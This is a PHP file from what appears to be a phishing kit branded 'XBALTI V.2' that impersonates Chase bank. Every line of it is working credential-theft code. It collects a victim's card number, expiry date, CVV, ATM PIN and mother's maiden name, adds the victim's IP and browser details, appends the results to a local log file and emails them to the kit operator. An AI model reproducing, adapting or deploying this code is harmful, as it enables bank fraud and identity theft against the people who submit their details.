<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \  XBALTI   /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                   
*/
session_start();
$_SESSION['CardNumber'] = $_POST['CardNumber'];
$_SESSION['ExpirationDate'] = $_POST['ExpirationDate'] ;
$_SESSION['Cvv'] = $_POST['Cvv'];
$_SESSION['AtmPin'] = $_POST['AtmPin'] ;
$_SESSION['MaidenName'] = $_POST['MaidenName'];
$TIME_DATE = date('H:i:s d/m/Y');
include('Email.php');
include('get_browser.php');
include('get_ip.php');
include('../antibot.php');
$XBALTI_MESSAGE .= "
<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
------------------ <font style='color: #820000;'>CARD BANK CHASE</font> ------------------<br/>
-_-_-_-_-_-_-_-_-[ <font style='color: #0a5d00;'>CARD INFORMATION</font> ]-_-_-_-_-_-_-_-_-<br>
<font style='color:#9c0000;'>😈</font> [Card Number]   = <font style='color:#0070ba;'>".$_SESSION['CardNumber']."</font><br>
<font style='color:#9c0000;'>😈</font> [Expiration Date]    = <font style='color:#0070ba;'>".$_SESSION['ExpirationDate']."</font><br>
<font style='color:#9c0000;'>😈</font> [Cvv]    = <font style='color:#0070ba;'>".$_SESSION['Cvv']."</font><br>
<font style='color:#9c0000;'>😈</font> [Atm Pin]   = <font style='color:#0070ba;'>".$_SESSION['AtmPin']."</font><br>
<font style='color:#9c0000;'>😈</font> [Maiden Name]    = <font style='color:#0070ba;'>".$_SESSION['MaidenName']."</font><br>
-_-_-_-_-_-_-_-_-[ <font style='color: #0a5d00;'>INFO VICTIM</font> ]-_-_-_-_-_-_-_-_-<br>
<font style='color:#9c0000;'>😈</font> [IP INFO]      = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#9c0000;'>😈</font> [TIME/DATE]    = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>😈</font> [BROWSER]      = <font style='color:#0070ba;'>".XBALTI_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XBALTI_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
------------------ <font style='color: #820000;'>BY XBALTI V.2</font> ------------------</div></html>\n";
    $khraha = fopen("../../1.php", "a");
	fwrite($khraha, $XBALTI_MESSAGE);
    $XBALTI_SUBJECT .= "NEW o_O ✪ O_o CARD : ".$_SESSION['_ip_']." 😈 ".$_SESSION['email']." 😈 ";
    $XBALTI_HEADERS .= "From: <XBALTIV2>";
    $XBALTI_HEADERS .= "XB-Version: 2.0\n";
    $XBALTI_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
    @mail($XBALTI_EMAIL, $XBALTI_SUBJECT, $XBALTI_MESSAGE, $XBALTI_HEADERS);

?>